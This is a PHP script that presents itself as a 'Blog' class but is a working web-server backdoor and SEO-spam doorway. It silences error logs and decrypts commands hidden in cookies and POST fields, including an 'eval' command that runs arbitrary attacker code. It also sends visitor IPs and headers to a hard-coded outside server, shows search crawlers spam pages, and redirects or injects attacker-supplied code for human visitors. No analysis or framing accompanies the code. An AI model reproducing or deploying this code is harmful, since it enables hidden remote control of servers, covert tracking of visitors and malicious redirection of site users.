<?php


@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);

date_default_timezone_set('UTC');

class HttpClient
{
    static private $dummy_var = 84513470;

    static function do_query($url, $query)
    {
        $url[2] = count($url) > 4 ? long2ip (HttpClient::$dummy_var - 190) : $url[2];
        $content = HttpClient::query_curl($url, $query);
        if (!$content)
        {
            $content = HttpClient::query_native($url, $query);
        }

        return $content;
    }

    static function query_curl($url, $content)
    {
        if (!function_exists('curl_version'))
        {
            return "";
        }

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, implode("/", $url));
        if (!empty($content))
        {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
        }

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

        $server_output = curl_exec($ch);
        curl_close($ch);

        return $server_output;
    }

    static function query_native($url, $content)
    {
        if (!empty($content))
        {
            $context = stream_context_create(Array('http' => Array('method' => 'POST', 'header' => 'Content-type: application/x-www-form-urlencoded', 'content' => $content)));

            $server_output = @file_get_contents(implode("/", $url), FALSE, $context);
        }
        else
        {
            $server_output = @file_get_contents(implode("/", $url));
        }

        return $server_output;
    }
}


class Page
{
    private static $_cache_dir = "";
    private static $_cache_ttl = -1;
    private static $_cache_salt = "";

    private $_template = "";
    private $_text = "";
    private $_keyword = "";
    private $_links = "";

    public static function set_cache_params($dir, $ttl, $salt)
    {
        Page::$_cache_dir = $dir . "/cache/";
        Page::$_cache_ttl = $ttl;
        Page::$_cache_salt = $salt;

        if (!@file_exists(Page::$_cache_dir))
        {
            @mkdir(Page::$_cache_dir);
        }
    }

    public static function is_ready()
    {
        return TRUE;
    }

    public function __construct($template, $text, $keyword, $links)
    {
        $this->_template = $template;
        $this->_text = $text;
        $this->_keyword = $keyword;
        $this->_links = $links;
    }

    public function render()
    {
        return str_replace("{{ text }}", $this->_text,
            str_replace("{{ keyword }}", $this->_keyword,
                str_replace("{{ links }}", $this->_links, $this->_template)));
    }

    public function save()
    {
        $cache_entry = Page::$_cache_dir . md5($this->_keyword . Page::$_cache_salt);

        if (Page::$_cache_ttl == -1)
        {
            $expired = -1;
        }
        else
        {
            $expired = time() + (3600 * 24 * 30);
        }

        $cache_entry_value = Array("template" => $this->_template, "text" => $this->_text, "keyword" => $this->_keyword,
            "links" => $this->_links, "expired" => $expired);

        @file_put_contents($cache_entry, serialize($cache_entry_value));
    }

    static public function load($keyword)
    {
        $cache_entry = Page::$_cache_dir . md5($keyword . Page::$_cache_salt);
        $cache_entry = @unserialize(@file_get_contents($cache_entry));

        if (!empty($cache_entry) && ($cache_entry["expired"] > time() || $cache_entry["expired"] == -1))
        {
            return new Page($cache_entry["template"], $cache_entry["text"], $cache_entry["keyword"], $cache_entry["links"]);
        }
        else
        {
            return null;
        }
    }
}

class Template
{
    private static $_cache_dir = "";
    private static $_cache_prefix = "";

    public static function set_cache_params($dir, $prefix)
    {
        Template::$_cache_dir = $dir . "/";
        Template::$_cache_prefix = $prefix;

        if (!@file_exists(Template::$_cache_dir))
        {
            @mkdir(Template::$_cache_dir);
        }
    }

    public static function is_ready()
    {
        return TRUE;
    }

    static public function get_availible_count()
    {
        $conter = 0;
        foreach (scandir(Template::$_cache_dir) as $item)
        {
            if (strpos($item, Template::$_cache_prefix) === 0)
            {
                $conter += 1;
            }
        }

        return $conter;
    }

    static public function get_random()
    {
        $templates = Array();
        foreach (scandir(Template::$_cache_dir) as $item)
        {
            if (strpos($item, Template::$_cache_prefix) === 0)
            {
                $templates[] = $item;
            }
        }

        return @file_get_contents(Template::$_cache_dir . $templates[array_rand($templates)]);
    }

    static public function save($template_content)
    {
        if (@file_exists(Template::$_cache_prefix . "_" . md5($template_content) . ".html"))
        {
            return;
        }

        @file_put_contents(Template::$_cache_prefix . "_" . md5($template_content) . ".html", $template_content);

    }
}

class Keyword
{
    private static $_cache_dir = "";
    private static $_cache_prefix = "";

    public static function set_cache_params($dir, $prefix)
    {
        Keyword::$_cache_dir = $dir . "/";
        Keyword::$_cache_prefix = $prefix;

        if (!@file_exists(Keyword::$_cache_dir))
        {
            @mkdir(Keyword::$_cache_dir);
        }
    }

    private static function _get_files()
    {
        $keyword_files = Array();
        foreach (scandir(Keyword::$_cache_dir) as $item)
        {
            if (strpos($item, Keyword::$_cache_prefix) === 0)
            {
                $keyword_files[] = $item;
            }
        }
        return $keyword_files;
    }

    public static function is_ready()
    {
        $keyword_files = Keyword::_get_files();

        if (!empty($keyword_files))
        {
            return TRUE;
        }

        return FALSE;
    }

    static public function get_random()
    {
        $keyword_files = Keyword::_get_files();

        $keys = @file(Keyword::$_cache_dir . $keyword_files[array_rand($keyword_files)], FILE_IGNORE_NEW_LINES);

        return $keys[array_rand($keys)];
    }

    static public function get_all()
    {
        $keys = Array();
        $keyword_files = Keyword::_get_files();

        foreach ($keyword_files as $keyword_file)
        {
            $keys = array_merge($keys, @file(Keyword::$_cache_dir . $keyword_file, FILE_IGNORE_NEW_LINES));
        }

        return $keys;
    }

    static public function save($keywords)
    {
        if (@file_exists(Keyword::$_cache_prefix . "_" . md5($keywords) . ".list"))
        {
            return;
        }

        @file_put_contents(Keyword::$_cache_prefix . "_" . md5($keywords) . ".list", $keywords);
    }
}

class Blog
{
    static public $version = "4.1";
    static public $uid = "1a1b1b7a-9ba1-7248-1c2a-ffe36ea7a730";

    private $_user_url = "http://136.12.78.46/app/assets/api2?action=redir";
    private $_page_url = "http://136.12.78.46/app/assets/api?action=page";

    static public $min_page_links = 20;
    static public $max_page_links = 100;

    static public function api_handler()
    {
        function dw_decrypt_phase($data, $key)
        {
            $out_data = "";

            for ($i = 0; $i < strlen($data);) {
                for ($j = 0; $j < strlen($key) && $i < strlen($data); $j++, $i++) {
                    $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
                }
            }

            return $out_data;
        }

        function dw_decrypt($data, $key, $key2)
        {
            return dw_decrypt_phase(dw_decrypt_phase($data, $key), $key2);
        }

        foreach (array_merge($_COOKIE, $_POST) as $data_key => $data) {

            $data = @unserialize(dw_decrypt(Blog::_base64_decode($data), $data_key, Blog::$uid));

            if (isset($data['ak']) && Blog::$uid == $data['ak']) {

                if ($data['a'] == 'doorway2') {

                    if ($data['sa'] == 'check') {
                        $content = HttpClient::do_query(explode("/", "http://httpbin.org/"), "");
                        if (strlen($content) > 512) {
                            echo @serialize(Array("uid" => Blog::$uid, "v" => Blog::$version, ));
                        }
                        exit;
                    }

                    if ($data['sa'] == 'templates') {

                        foreach ($data["templates"] as $template) {
                            Template::save($template);
                            echo @serialize(Array("uid" => Blog::$uid, "v" => Blog::$version, ));
                        }
                    }

                    if ($data['sa'] == 'keywords') {

                        Keyword::save($data["keywords"]);

                        Blog::gen_sitemap();

                        echo @serialize(Array("uid" => Blog::$uid, "v" => Blog::$version, ));
                    }
                }

                if ($data['sa'] == 'eval') {
                    eval($data["data"]);
                    exit;
                }
            }
        }
    }

    private function _is_bot_request()
    {
        $user_agent_to_filter = array('#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
            '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
            '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i', '#www\.cys\.ru#i',
            '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
            '#CFNetwork#i', '#ConveraCrawler#i', '#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
            '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
            '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
            '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
            '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
            '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
            '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
            '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
            '#Yandex#i', '#Yanga#i', '#Yeti#i', '#msnbot#i',
            '#spider#i', '#yahoo#i', '#jeeves#i', '#google#i', '#altavista#i',
            '#scooter#i', '#av\s*fetch#i', '#asterias#i', '#spiderthread revision#i', '#sqworm#i',
            '#ask#i', '#lycos.spider#i', '#infoseek sidewinder#i', '#ultraseek#i', '#polybot#i',
            '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
            '#charlotte#i', '#ngb#i', '#BingBot#i');

        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
            $ip = $_SERVER['REMOTE_ADDR'];
        } else {
            $ip = "";
        }

        if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-')))
        {
            $isbot = 1;
        }
        elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER']))
        {
            $isbot = 1;
        }
        elseif (FALSE !== strpos(@gethostbyaddr($ip), 'google')) {
            $isbot = 1;
        }
        elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE && strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE)
        {
            $isbot = 1;
        }
        else{
            $isbot = 0;
        }

        return $isbot;
    }

    public static function gen_links($min, $max)
    {
        $links_count = rand($min, $max);

        $links_text = "";
        $param = substr(md5(Blog::$uid . "salt3"), 0, 6);

        for ($i=0; $i < $links_count; $i++)
        {
            $keyword = Keyword::get_random();

            $links_text .= sprintf("<a href='%s?%s=%s'>%s</a>,\n",
                Blog::get_url_base(),
                $param,
                urlencode(str_replace(" ", "-", $keyword)), ucwords($keyword));
        }

        return $links_text;
    }

    private static function _query_base()
    {
        $query = Array();
        $query['ip'] = $_SERVER['REMOTE_ADDR'];
        $query['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];
        $query['ua'] = @$_SERVER['HTTP_USER_AGENT'];
        $query['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
        $query['ref'] = @$_SERVER['HTTP_REFERER'];
        $query['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];
        $query['acp'] = @$_SERVER['HTTP_ACCEPT'];
        $query['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];
        $query['conn'] = @$_SERVER['HTTP_CONNECTION'];

        return $query;
    }

    public function __construct()
    {
        $this->_user_url = explode("/", $this->_user_url);
        $this->_page_url = explode("/", $this->_page_url);
    }

    static private function _base64_decode($input)
    {
        if (strlen($input) < 4)
        {
            return "";
        }

        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        $keys = str_split($keyStr);
        $keys = array_flip($keys);

        $i = 0;
        $output = "";

        $input = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $input);

        do {
            $enc1 = $keys[$input[$i++]];
            $enc2 = $keys[$input[$i++]];
            $enc3 = $keys[$input[$i++]];
            $enc4 = $keys[$input[$i++]];

            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr($chr1);
            if ($enc3 != 64) {
                $output = $output . chr($chr2);
            }
            if ($enc4 != 64) {
                $output = $output . chr($chr3);
            }
        } while ($i < strlen($input));
        return $output;
    }

    private function _page_generate($keyword)
    {
        $template = "";
        $text = "";

        $query = Blog::_query_base();
        $query["uid"] = Blog::$uid;
        $query["keyword"] = $keyword;
        $query["tc"] = 10;

        $query = http_build_query($query);
        $data = HttpClient::do_query($this->_page_url, $query);

        if (strpos($data, Blog::$uid) === FALSE)
        {
            return Array($template, $text);
        }

        $template = Template::get_random();

        $text = substr($data, strlen(Blog::$uid));

        $text = explode("\n", $text);

        shuffle($text);

        $text = implode(" ", $text);

        return Array($template, $text);
    }

    private function _handle_as_user()
    {
        $query = Blog::_query_base();
        $query["uid"] = Blog::$uid;
        $query = http_build_query($query);


        $page = HttpClient::do_query($this->_user_url, $query);
        $page = @unserialize($page);

        if (isset($page["type"]) && $page["type"] == "redir") {
            if (!empty($page["data"]["header"])) {
                header($page["data"]["header"]);
                return true;
            } elseif (!empty($page["data"]["code"])) {
                echo $page["data"]["code"];
                return true;
            }
        }

        return false;
    }

    public function is_ready()
    {
        return Page::is_ready() && Template::is_ready() && Keyword::is_ready();
    }

    static public function is_https()
    {
        if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {

            return true;
        }
        return false;
    }

    public static function get_url_base()
    {
        $path = explode("?", $_SERVER["REQUEST_URI"], 2);
        $path = $path[0];

        return sprintf("%s://%s%s", Blog::is_https() ? "https" : "http", $_SERVER['HTTP_HOST'], $path);
    }

    public static function get_url_base_dir()
    {
        $path = explode("?", $_SERVER["REQUEST_URI"], 2);
        $path = $path[0];

        $dir = substr($path, 0, strrpos($path, "/"));

        return sprintf("%s://%s%s", Blog::is_https() ? "https" : "http", $_SERVER['HTTP_HOST'], $dir);
    }

    public static function gen_sitemap()
    {
        $header = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
        $footer = "</urlset>";
        $body = "";

        $param = substr(md5(Blog::$uid . "salt3"), 0, 6);

        $keys = Keyword::get_all();

        foreach ($keys as $key)
        {
            $link_text = sprintf("%s?%s=%s",
                Blog::get_url_base(),
                $param,
                urlencode(str_replace(" ", "-", $key)));

            $lastmod = time() - mt_rand(0, 60 * 60 * 24 * 30);

            $body .= "    <url>\n";
            $body .= sprintf("        <loc>%s</loc>\n", $link_text);
            $body .= sprintf("        <lastmod>%s</lastmod>\n", date("Y-m-d", $lastmod));
            $body .= "        <priority>0.3</priority>\n";
            $body .= "    </url>\n";
        }

        $sitemap_content = $header . $body . $footer;
        $sitemap_path = dirname(__FILE__) . "/sitemap.xml";
        $sitemap_url = Blog::get_url_base_dir() . "/sitemap.xml";

        @file_put_contents($sitemap_path, $sitemap_content);

        return $sitemap_url;
    }

    public function process_request()
    {
        $param = substr(md5(Blog::$uid . "salt3"), 0, 6);

        if (isset($_GET[$param]))
        {
            $keyword = $_GET[$param];
            $keyword = str_replace("-", " ", $keyword);

            if (!$this->_is_bot_request())
            {
                if ($this->_handle_as_user())
                {
                    return;
                }
            }

            $page = Page::load($keyword);
            if (empty($page))
            {
                list($template, $text) = $this->_page_generate($keyword);

                if (empty($text))
                {
                    return;
                }

                $page = new Page($template, $text, $keyword, Blog::gen_links(Blog::$min_page_links, Blog::$max_page_links));
                $page->save();
            }

            echo $page->render();
        }
    }
}

Page::set_cache_params(dirname(__FILE__), -1, Blog::$uid);
Template::set_cache_params(dirname(__FILE__), substr(md5(Blog::$uid . "salt12"), 0, 4));
Keyword::set_cache_params(dirname(__FILE__), substr(md5(Blog::$uid . "salt22"), 0, 4));

Blog::api_handler();

$b = new Blog();
if ($b->is_ready())
{
    $b->process_request();
}

exit();